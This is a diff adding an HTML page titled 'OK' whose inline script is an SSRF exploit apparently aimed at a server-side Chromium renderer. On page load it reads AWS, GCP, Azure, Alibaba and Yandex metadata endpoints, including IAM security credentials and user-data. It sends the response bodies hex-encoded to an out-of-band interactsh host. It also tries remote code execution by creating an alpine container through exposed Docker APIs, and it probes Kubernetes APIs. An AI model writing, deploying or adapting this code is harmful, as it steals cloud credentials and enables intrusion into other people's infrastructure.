@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>OK</title></head>
+<body>
+<script>
+'use strict';
+// ok.ru Chromium SSRF — probe v6
+// Goal: IMDS exfiltration + Docker/K8s via public IP
+// OOB updated to current session
+
+const OOB = 'd9qp7kj6b8mduf5mnh3gf5w85bm65a1gq.oast.pro';
+const T0 = Date.now();
+
+const clean = (s) => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+
+// DNS + HTTP OOB via subdomain
+const dnsOob = (label) => {
+  const l = clean(label);
+  new Image().src = `https://${l}.${OOB}/`;
+  fetch(`https://${l}.${OOB}/`, { mode: 'no-cors', signal: AbortSignal.timeout(4000) }).catch(() => {});
+};
+
+// HTTP OOB with data in path (interactsh logs full path)
+const httpOob = (path) => {
+  fetch(`http://${OOB}/${path}`, { mode: 'no-cors', signal: AbortSignal.timeout(4000) }).catch(() => {});
+};
+
+const errCode = (e) => {
+  if (!e) return 'unk';
+  const n = e.name || '';
+  const m = (e.message || '').substring(0, 40).toLowerCase();
+  if (n === 'AbortError') return 'time';
+  if (n === 'TypeError' && m.includes('failed')) return 'te-ff';
+  if (n === 'TypeError') return 'te';
+  return 'oth';
+};
+
+// CORS fetch — reads response body and exfiltrates via OOB
+const probe = async (lp, url, hdrs = {}, ms = 8000) => {
+  const t0 = Date.now();
+  try {
+    const r = await fetch(url, { headers: hdrs, signal: AbortSignal.timeout(ms) });
+    const body = await r.text();
+    const elapsed = Date.now() - t0;
+    const snip = clean(body.substring(0, 8));
+    dnsOob(`${lp}-ok-${r.status}-${elapsed}ms-${snip}`);
+    // exfil first 200 bytes as hex via OOB path
+    if (body.length > 0) {
+      const hex = Array.from(new TextEncoder().encode(body.substring(0, 200)))
+        .map(b => b.toString(16).padStart(2,'0')).join('');
+      // send in 50-hex-char chunks
+      const chunks = hex.match(/.{1,50}/g) || [];
+      chunks.forEach((c,i) => {
+        httpOob(`exfil/${lp}/b${i}/${c}`);
+      });
+    }
+  } catch (e) {
+    dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`);
+  }
+};
+
+// no-cors probe (for private IPs where CORS mode triggers PNA preflight)
+const ncProbe = async (lp, url, method = 'GET', body = null, ms = 7000) => {
+  const t0 = Date.now();
+  const opts = { method, mode: 'no-cors', signal: AbortSignal.timeout(ms) };
+  if (body !== null) opts.body = body;
+  try {
+    await fetch(url, opts);
+    dnsOob(`${lp}-nc-ok-${Date.now()-t0}ms`);
+  } catch (e) {
+    dnsOob(`${lp}-nc-err-${errCode(e)}-${Date.now()-t0}ms`);
+  }
+};
+
+(async () => {
+  dnsOob(`exec-v6-start`);
+
+  // ── Step 1: Get our public IP ─────────────────────────────────────────────
+  let myIP = null;
+  try {
+    const r = await fetch('https://api.ipify.org/?format=text', { signal: AbortSignal.timeout(10000) });
+    myIP = (await r.text()).trim();
+    dnsOob(`myip-${myIP.replace(/\./g,'-')}`);
+  } catch(e) {
+    dnsOob(`myip-err-${errCode(e)}`);
+    try {
+      const r2 = await fetch('https://checkip.amazonaws.com/', { signal: AbortSignal.timeout(10000) });
+      myIP = (await r2.text()).trim();
+      dnsOob(`myip2-${myIP.replace(/\./g,'-')}`);
+    } catch(e2) { dnsOob(`myip2-err`); }
+  }
+
+  // ── Step 2: AWS IMDSv1 ────────────────────────────────────────────────────
+  await probe('aws-root',    'http://169.254.169.254/latest/meta-data/');
+  await probe('aws-iam',     'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+  await probe('aws-token',   'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/');
+  await probe('aws-userdat', 'http://169.254.169.254/latest/user-data/');
+
+  // ── Step 3: GCP IMDS ──────────────────────────────────────────────────────
+  await probe('gcp-root', 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json',
+    {'Metadata-Flavor':'Google'});
+  await probe('gcp-169', 'http://169.254.169.254/computeMetadata/v1/?recursive=true&alt=json',
+    {'Metadata-Flavor':'Google'});
+
+  // ── Step 4: Azure IMDS ───────────────────────────────────────────────────
+  await probe('az-imds', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+    {'Metadata':'true'});
+
+  // ── Step 5: Alibaba / Yandex Cloud IMDS ──────────────────────────────────
+  await probe('ali-imds', 'http://100.100.100.200/latest/meta-data/');
+  await probe('yc-imds',  'http://169.254.169.254/latest/meta-data/');
+
+  // ── Step 6: Docker via public IP (if available) ──────────────────────────
+  if (myIP) {
+    await probe('dp-ping',   `http://${myIP}:2375/_ping`, {}, 8000);
+    await probe('dp-cjson',  `http://${myIP}:2375/containers/json`, {}, 8000);
+
+    // no-cors POST /containers/create (RCE attempt, no preflight for same-tier public→public)
+    const createBody = JSON.stringify({
+      Image: 'alpine',
+      Cmd: ['wget','-q','-T','5',`http://${OOB}/v6rce`],
+      HostConfig:{ NetworkMode:'bridge' }
+    });
+    await ncProbe('v6cr', `http://${myIP}:2375/containers/create?name=rce-v6`, 'POST', createBody, 8000);
+    await new Promise(r => setTimeout(r, 400));
+    await ncProbe('v6st', `http://${myIP}:2375/containers/rce-v6/start`, 'POST', '', 8000);
+    await new Promise(r => setTimeout(r, 8000));
+    dnsOob('v6-rce-wait-done');
+
+    // K8s insecure port
+    await probe('k8s-api',  `http://${myIP}:8080/api`);
+    await probe('k8s-ver',  `http://${myIP}:8080/version`);
+  }
+
+  // ── Step 7: Private Docker (PNA timing) ──────────────────────────────────
+  await ncProbe('priv-dp-172', 'http://172.17.0.1:2375/_ping');
+  await ncProbe('priv-dp-10',  'http://10.0.0.1:2375/_ping');
+
+  // ── Step 8: Kubernetes API from pod network ──────────────────────────────
+  await probe('k8s-svc-9443',  'http://10.96.0.1:9443/version');
+  await probe('k8s-svc-8080',  'http://10.96.0.1:8080/version');
+  await probe('k8s-svc-6443',  'https://kubernetes.default.svc/version');
+
+  dnsOob(`done-v6-${Date.now()-T0}ms`);
+})();
+</script>
+</body>
+</html>
